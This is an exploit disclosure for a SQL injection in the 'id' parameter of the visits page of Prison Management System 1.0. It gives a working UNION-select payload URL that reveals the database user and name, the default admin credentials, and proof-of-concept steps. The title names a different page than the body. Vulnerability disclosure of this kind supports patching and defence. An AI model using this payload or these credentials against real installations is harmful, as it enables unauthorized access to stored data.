# Prison Management System  - Inmates/view_inmate 'id' SQL inject(SQLI)


#### Exploit Title: Prison Management System  - /admin/visits/view_visit.php 'id' SQL inject(SQLI)
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://www.sourcecodester.com/php/15368/prison-management-system-phpoop-free-source-code.html
#### Software Link:https://www.sourcecodester.com/download-code?nid=15368&title=Prison+Management+System+in+PHP%2FOOP+Free+Source+Code
#### Version: Prison Management System 1.0
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Prison Management System does not filter the content correctly at the `/admin/visits/view_visit.php` "id" parameter, resulting in the generation of SQL injection.

#### Payload used:
/pms/admin/visits/view_visit.php?id=2%27and%201=2%20union%20select%201,2,3,4,5,6,7,user(),database()--+

#### Proof of Concept

1. Login the CMS. 
     Admin Default Access:
       username:admin
       Password: admin123

2. Open Page http://localhost/pms/admin/?page=visits click View button

   ![image-20220606165326315](Prison Management System(SQLI)2.assets/image-20220606165326315.png)

   ![image-20220606165410485](Prison Management System(SQLI)2.assets/image-20220606165410485.png)

   

3. Put SQL payload   in the browser;

     ![image-20220606165443092](Prison Management System(SQLI)2.assets/image-20220606165443092.png)


4. Viewing the dbuser and database name in page;

   

